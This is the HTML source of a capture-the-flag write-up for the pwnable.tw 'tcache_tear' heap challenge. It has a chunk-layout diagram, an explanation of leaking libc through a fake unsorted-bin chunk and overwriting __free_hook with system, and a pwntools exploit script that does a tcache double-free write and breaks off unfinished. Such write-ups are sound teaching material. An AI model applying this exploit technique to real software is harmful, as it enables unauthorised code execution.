xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 116px; margin-left: 141px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Pointer to Next Chunk&lt;br style=&quot;font-size: 7px&quot; &#x2F;&gt;&lt;font size=&quot;1&quot;&gt;(fwd pointer)&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;300&quot; y=&quot;120&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Pointer to Next Chunk...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;140&quot; y=&quot;136&quot; width=&quot;320&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 156px; margin-left: 141px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Pointer to Previous Chunk&lt;br style=&quot;font-size: 7px&quot; &#x2F;&gt;&lt;font size=&quot;1&quot;&gt;(bck pointer)&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;300&quot; y=&quot;160&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Pointer to Previous Chunk...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;140&quot; y=&quot;176&quot; width=&quot;320&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 196px; margin-left: 141px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Unused Space&lt;br &#x2F;&gt;&lt;font style=&quot;font-size: 10px&quot;&gt;(used to align chunk to 16 byte boundary)&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;300&quot; y=&quot;200&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Unused Space...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;136&quot; width=&quot;120&quot; height=&quot;40&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 156px; margin-left: 1px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;User Memory Region&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;60&quot; y=&quot;160&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;User Memory Region&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;140&quot; y=&quot;16&quot; width=&quot;320&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 36px; margin-left: 141px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Size of Previous Chunk&lt;br &#x2F;&gt;&lt;font style=&quot;font-size: 10px&quot;&gt;(Only valid if P is set)&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;300&quot; y=&quot;40&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Size of Previous Chunk...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;140&quot; y=&quot;216&quot; width=&quot;320&quot; height=&quot;40&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 236px; margin-left: 141px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Size of Previous Chunk&lt;br &#x2F;&gt;&lt;font style=&quot;font-size: 10px&quot;&gt;(Same as &lt;i&gt;Chunk Size&lt;&#x2F;i&gt;)&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;300&quot; y=&quot;240&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Size of Previous Chunk...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 480 16 L 475 16 Q 470 16 470 26 L 470 106 Q 470 116 465 116 L 462.5 116 Q 460 116 465 116 L 467.5 116 Q 470 116 470 126 L 470 206 Q 470 216 475 216 L 480 216&quot; fill=&quot;none&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(180,470,116)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;478&quot; y=&quot;105&quot; width=&quot;102&quot; height=&quot;20&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 100px; height: 1px; padding-top: 115px; margin-left: 479px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Chunk&lt;br style=&quot;font-size: 8px&quot; &#x2F;&gt;&lt;font size=&quot;1&quot;&gt;(User Region - 0x10)&lt;br &#x2F;&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;529&quot; y=&quot;119&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Chunk...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 140 96 L 135 96 Q 130 96 130 106 L 130 146 Q 130 156 125 156 L 122.5 156 Q 120 156 125 156 L 127.5 156 Q 130 156 130 166 L 130 206 Q 130 216 135 216 L 140 216&quot; fill=&quot;none&quot; stroke=&quot;#6c8ebf&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 120 216 L 140 216 L 133.63 216&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-opacity=&quot;0.8&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 138.88 216 L 131.88 219.5 L 133.63 216 L 131.88 212.5 Z&quot; fill-opacity=&quot;0.8&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-opacity=&quot;0.8&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;10&quot; y=&quot;196&quot; width=&quot;110&quot; height=&quot;40&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 108px; height: 1px; padding-top: 216px; margin-left: 11px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Start of Next Chunk&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;65&quot; y=&quot;220&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Start of Next Chunk&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;&#x2F;g&gt;&lt;switch&gt;&lt;g requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&#x2F;&gt;&lt;a transform=&quot;translate(0,-5)&quot; xlink:href=&quot;https:&#x2F;&#x2F;desk.draw.io&#x2F;support&#x2F;solutions&#x2F;articles&#x2F;16000042487&quot; target=&quot;_blank&quot;&gt;&lt;text text-anchor=&quot;middle&quot; font-size=&quot;10px&quot; x=&quot;50%&quot; y=&quot;100%&quot;&gt;Viewer does not support full SVG 1.1&lt;&#x2F;text&gt;&lt;&#x2F;a&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;svg&gt;
&lt;p&gt;Unsorted bins are a circularly linked list. This means that in an unsorted bin with a single chunk, the chunk will have 
its &lt;code&gt;fwd&lt;&#x2F;code&gt; and &lt;code&gt;bck&lt;&#x2F;code&gt; pointers set to the address of the unsorted bin. If we are able to read either the &lt;code&gt;fwd&lt;&#x2F;code&gt; or &lt;code&gt;bck&lt;&#x2F;code&gt; 
pointer, we have an address with a known offset from libc.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;crafting-chunks&quot;&gt;Crafting Chunks&lt;&#x2F;h2&gt;
&lt;p&gt;Luckily, we have the &lt;code&gt;name&lt;&#x2F;code&gt; buffer and can print its contents. If we create a fake chunk of unsorted bin size and place 
it in the name buffer, we can leak libc. &lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately, there are some &lt;a href=&quot;https:&#x2F;&#x2F;heap-exploitation.dhavalkapil.com&#x2F;diving_into_glibc_heap&#x2F;security_checks.html&quot;&gt;security checks&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;quot;Check whether next chunk&#x27;s (by memory) previous in use bit is marked&amp;quot;&lt;&#x2F;li&gt;
&lt;li&gt;&amp;quot;Check whether size of next chunk is within the minimum and maximum size (av-&amp;gt;system_mem)&amp;quot;&lt;&#x2F;li&gt;
&lt;li&gt;&amp;quot;If the chunk is not within the size range of fastbin and isn&#x27;t mmapped, check that it is not the same as the top chunk&amp;quot;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;To bypass these checks we can create another chunk that is positioned immediately after the first chunk. The comments in 
the solution script explain this further.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;getting-a-shell&quot;&gt;Getting a Shell&lt;&#x2F;h2&gt;
&lt;p&gt;Now that we have the libc base address, we can get the address of &lt;code&gt;__free_hook&lt;&#x2F;code&gt;. This is a function pointer that is 
called whenever free is called; the address of the chunk being freed is passed as a parameter. Conveniently, this 
function signature matches &lt;code&gt;system(char* cmd)&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
&lt;p&gt;Now, if we call &lt;code&gt;malloc(&amp;quot;&#x2F;bin&#x2F;sh\x00&amp;quot;)&lt;&#x2F;code&gt; and then free the returned value, a shell is created.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h1&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.terminal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;bin&#x2F;sh&amp;#39;

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;remote(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;chall.pwnable.tw&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10207&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)


elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;tcache_tear&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;libc.so.6&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;malloc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size, data):
	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc_counter
	malloc_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1

	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Size:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size))
	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Data:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	r.send(data)
	
	info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;[Malloc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;] Allocated chunk [size: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;, data: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;]&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(malloc_counter, size, data))

free_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free_counter
	free_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;  [Free &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;{n}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;] Freed last allocated chunk&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.format(n&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free_counter))


&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;mem_write&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(address, value, s):
	info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;[Mem Write ] Writing &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt; to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(value, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(address)))
	malloc(s, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;anything&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	free()
	free()
	malloc(s, p64(address))
	malloc(s, p64(address))
	malloc(s, value)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;get_info&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(elf.got)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(elf.symbols)

r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Name:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;anything&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)


mem_write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x602550&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, 
			p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Previous Size
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Chunk Size (A=0, M=0, P=1)
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Forward Pointer
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Backward Pointer
